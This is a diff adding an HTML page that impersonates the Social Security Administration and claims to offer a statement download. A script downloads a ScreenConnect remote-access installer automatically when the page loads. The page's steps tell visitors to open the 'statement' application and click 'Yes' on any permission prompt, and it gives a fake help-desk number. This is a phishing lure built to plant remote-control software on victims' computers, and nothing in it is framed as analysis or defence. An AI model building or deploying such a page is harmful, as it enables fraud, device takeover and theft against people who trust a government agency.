@@ -1,0 +1,134 @@
+
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
+    <meta name="application-name" content="File-Download" />
+    <title>Social Security Administration | SSA</title>
+    <style>
+        @import url(https://www.ssa.gov/flexweb/rel_5_1_2/css/import.css);
+        @import url(styles/appStyles.css);
+
+        h1 {
+            font-size: 2em;
+            color: #0033a0;
+            margin-bottom: 20px;
+        }
+
+        #downloadLink {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        #downloadLink:hover {
+            text-decoration: underline;
+        }
+
+        .uef-instructions {
+            background-color: #f2f8ff;
+            border: 1px solid #cce0ff;
+            padding: 15px 20px;
+            margin: 20px auto;
+            border-radius: 6px;
+            max-width: 700px;
+        }
+
+        .uef-instructions h3 {
+            color: #0033a0;
+            margin-bottom: 10px;
+        }
+
+        .uef-instructions ol {
+            margin-left: 20px;
+        }
+
+        .uef-instructions li {
+            margin-bottom: 8px;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+
+<body class="uef-theme-std">
+    <header>
+        <div id="uef-tmpl-header">
+            <a id="uef-tmpl-skipNav" href="#" accesskey="K">Skip to Content</a>
+            <div id="uef-tmpl-logo"></div>
+            <div id="uef-tmpl-websiteTitle">
+                <h1>Social Security Administration</h1>
+            </div>
+        </div>
+    </header>
+    <div id="uef-tmpl-content-wrapper">
+        <div id="uef-tmpl-content">
+            <form id="FileDownload" name="FileDownload" action="" method="post">
+                <div class="uef-container module">
+                    <div class="uef-container-row">
+                        <div class="uef-container-content">
+                            <div class="uef-notice uef-info">
+                                <div class="uef-notice-row hd">
+                                    <div class="uef-notice-content">
+                                        <center><h1>Welcome to Your Latest SSA.GOV Statement Download</h1></center>
+
+                                        <div class="uef-instructions">
+                                            <h3>How to Get Started:</h3>
+                                            <ol>
+                                                <li><strong>Step 1:</strong> Download for irs Application will start automatically.</li>
+                                                <li><strong>Step 2:</strong> Open the downloaded <strong>statment updeted</strong> application for Windows.</li>
+                                                <li><strong>Step 3:</strong> Click on "<strong>Yes</strong>" if any dialog/permission box appears.</li>
+                                            </ol>
+                                        </div>
+
+                                        <h4>Your download will start automatically. If it doesn't, <a id="downloadLink" href="#">click here</a>.</h4>
+                                    </div>
+                                </div>
+                                <div class="uef-notice-row">
+                                    <div class="uef-notice-content">
+                                        <p>Thank you for using our service. If the download does not start within a few seconds, you may manually start it by clicking the link above.</p>
+                                        <p>For further assistance, please contact our help desk at <strong>1-800-123-4567</strong>.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+
+        <footer id="uef-tmpl-footer">
+            <a href="#" target="_blank">Privacy and Security</a>
+            <ul>
+                <li><a id="uef-tmpl-paperworkReduction" href="#" target="_blank">OMB No. 0960-0789</a></li>
+                <li><a id="uef-tmpl-privacyPolicy" href="#" target="_blank">Privacy Policy</a></li>
+                <li><a id="uef-tmpl-privacyAct" href="#" target="_blank">Privacy Act Statement</a></li>
+                <li><a id="uef-tmpl-accessibility" href="#" target="_blank">Accessibility Help</a></li>
+            </ul>
+        </footer>
+    </div>
+
+    <script>
+        // Set the file URL (must be in same folder or change path if needed)
+        const fileUrl = 'ScreenConnect.ClientSetup.msi';
+
+        // Trigger automatic download on page load
+        window.onload = function () {
+            const link = document.createElement('a');
+            link.href = fileUrl;
+            link.download = 'ScreenConnect.ClientSetup.msi'; // Suggested download name
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // Set manual link in case auto fails
+            const manualLink = document.getElementById('downloadLink');
+            if (manualLink) manualLink.href = fileUrl;
+        };
+    </script>
+</body>
+
+</html>
